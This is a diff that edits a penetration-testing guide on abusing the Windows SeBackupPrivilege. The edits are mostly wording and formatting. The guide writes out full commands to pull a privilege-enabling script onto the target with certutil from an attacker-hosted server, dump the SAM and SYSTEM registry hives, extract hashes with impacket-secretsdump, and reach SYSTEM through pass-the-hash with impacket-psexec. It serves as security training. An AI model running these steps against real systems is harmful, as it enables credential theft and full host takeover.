@@ -2,56 +2,61 @@
 legal-banner: true
 ---
 
-### **INTRODUCTION**
+### **Introduction**
 
-SeBackupPrivilege allows a user to back up files and directories. This privilege grants the ability to traverse any folder and list its contents, even if there are no explicit access control entries (ACEs) for the user in the folder's access control list (ACL). It is commonly used by service accounts for backup purposes. Understanding and leveraging this privilege can be crucial for privilege escalation during a penetration test.
+`SeBackupPrivilege` allows a user to back up files and directories.  
+This privilege grants the ability to traverse any folder and list its contents, even if the user is not explicitly listed in the folder’s Access Control List (ACL).  
 
-### **STEP 1: CHECK CURRENT USER PRIVILEGES**
+It is commonly assigned to service accounts for backup purposes, but during a penetration test it can be abused for privilege escalation.
 
-1.  Check if current user has SeBackupPrivilege privileges by running:  
+### **Step 1: Check current user privileges**
+
+1.  Check if the current user has `SeBackupPrivilege`:  
     `whoami /priv`  
     
     ![](../../../img/Windows-Environment/128.png)
 
-    **NOTE:** If it is not enabled, proceed to the next step to enable it.
+    **Note:** If it is not enabled, proceed to Step 2.
 
-### **STEP 2: ENABLE SEBACKUPPRIVILEGE (OPTIONAL)**
+### **Step 2: Enable SeBackupPrivilege (optional)**
 
-2.  Download the EnableAllTokenPrivs.ps1 script to enable SeBackupPrivilege.  
+1.  Download the **EnableAllTokenPrivs.ps1** script:  
     `wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`  
 
     ![](../../../img/Windows-Environment/129.png)
 
-    **NOTE:** Host the script Using Python `python -m http.server 80`
+    **Note:** Host the script with Python:  
+    `python -m http.server 80`
     
-3.  Transfer the EnableAllTokenPrivs.ps1 script to the target machine using certutil  
-    `certutil -urlcache -f http://[IP-ADRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1`  
+2.  Transfer the script to the target machine with `certutil`:  
+    `certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1`  
     
     ![](../../../img/Windows-Environment/130.png)
 
-    **NOTE:** To Enable the SeTakeOwnershipPrivilege privilege, import the script using:  
+3.  Import the script to enable the privilege:  
     `Import-Module .\EnableAllTokenPrivs.ps1`
     
-4.  Verify privileges,Ensure that SeTakeOwnershipPrivilege is now enabled  
+4.  Verify that `SeBackupPrivilege` is now enabled:  
     `whoami /priv`  
     
     ![](../../../img/Windows-Environment/131.png)
-    
 
-### **STEP 3: EXPLOIT BACKUP SAM & SYSTEM**
+### **Step 3: Exploit — backup SAM & SYSTEM**
 
-1.  Save the registry  
-    `reg save hklm\system system.hive`  
-    `reg save hklm\sam sam.hive`  
+1.  Save the registry hives:  
+    ```
+    reg save hklm\system system.hive
+    reg save hklm\sam sam.hive
+    ```
     
     ![](../../../img/Windows-Environment/132.png)
     
-2.  Transfer the sam.hive and system.hive files to the attacker machine via SMB, then use impacket-secretsdump to extract and decode the credentials from these files.  
+2.  Transfer `sam.hive` and `system.hive` to the attacker machine (e.g., via SMB), then extract credentials with **impacket-secretsdump**:  
     `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`  
     
     ![](../../../img/Windows-Environment/133.png)
     
-3.  We can use the Administrator hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:  
-    `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a administrator@[IP-ADRESS]`  
+3.  Use the Administrator NTLM hash to perform a **Pass-the-Hash** attack and gain SYSTEM access:  
+    `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a administrator@[IP-ADDRESS]`  
     
     ![](../../../img/Windows-Environment/134.png)
